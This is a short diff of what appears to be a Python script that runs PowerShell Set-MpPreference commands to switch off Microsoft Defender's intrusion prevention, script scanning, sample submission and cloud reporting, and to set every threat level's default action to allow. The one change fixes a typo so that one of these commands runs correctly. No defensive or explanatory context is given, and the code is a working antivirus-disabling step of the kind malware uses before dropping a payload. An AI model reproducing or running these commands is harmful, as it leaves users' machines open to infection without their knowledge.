@@ -28,7 +28,7 @@ subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreve
 subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=TRUE)
 subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=TRUE)
 subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=TRUE)
-subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Forc", shell=TRUE)
+subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=TRUE)
 subprocess.call("powershell.exe -command Set-MpPreference -ModerateThreatDefaultAction 6", shell=TRUE)
 subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=TRUE)
 subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=TRUE)
